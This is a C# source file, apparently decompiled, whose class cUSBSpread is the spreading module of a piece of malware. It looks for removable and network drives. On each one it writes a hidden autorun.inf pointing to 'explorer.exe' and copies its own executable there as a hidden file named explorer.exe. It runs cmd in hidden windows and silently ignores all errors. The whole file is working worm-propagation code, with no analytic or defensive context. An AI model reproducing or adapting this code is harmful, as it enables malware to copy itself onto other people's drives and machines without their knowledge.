using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

namespace SysDriver;

internal class cUSBSpread
{
	public static void USBSpread()
	{
		try
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			DriveInfo[] array = drives;
			foreach (DriveInfo driveInfo in array)
			{
				if ((driveInfo.DriveType != DriveType.Removable && driveInfo.DriveType != DriveType.Network) || File.Exists(driveInfo.Name + "explorer.exe"))
				{
					continue;
				}
				Process process = new Process();
				process.EnableRaisingEvents = false;
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.StartInfo.FileName = "cmd";
				process.StartInfo.Arguments = "/c echo [autorun] >> " + driveInfo.Name + "autorun.inf";
				process.Start();
				while (!process.HasExited)
				{
				}
				Process process2 = new Process();
				process2.EnableRaisingEvents = false;
				process2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process2.StartInfo.FileName = "cmd";
				process2.StartInfo.Arguments = "/c echo open=explorer.exe >> " + driveInfo.Name + "autorun.inf";
				process2.Start();
				while (!process2.HasExited)
				{
				}
				File.SetAttributes(driveInfo.Name + "autorun.inf", File.GetAttributes(driveInfo.Name + "autorun.inf") | FileAttributes.Hidden);
				_ = Process.GetCurrentProcess().MainModule!.FileName;
				try
				{
					Process process3 = new Process();
					process3.EnableRaisingEvents = false;
					process3.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					process3.StartInfo.FileName = "cmd";
					process3.StartInfo.Arguments = "/c copy \"" + Application.get_ExecutablePath() + "\" \"" + driveInfo.Name + "explorer.exe\"";
					process3.Start();
					while (!process3.HasExited)
					{
					}
					File.SetAttributes(driveInfo.Name + "explorer.exe", File.GetAttributes(driveInfo.Name + "explorer.exe") | FileAttributes.Hidden);
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
	}
}
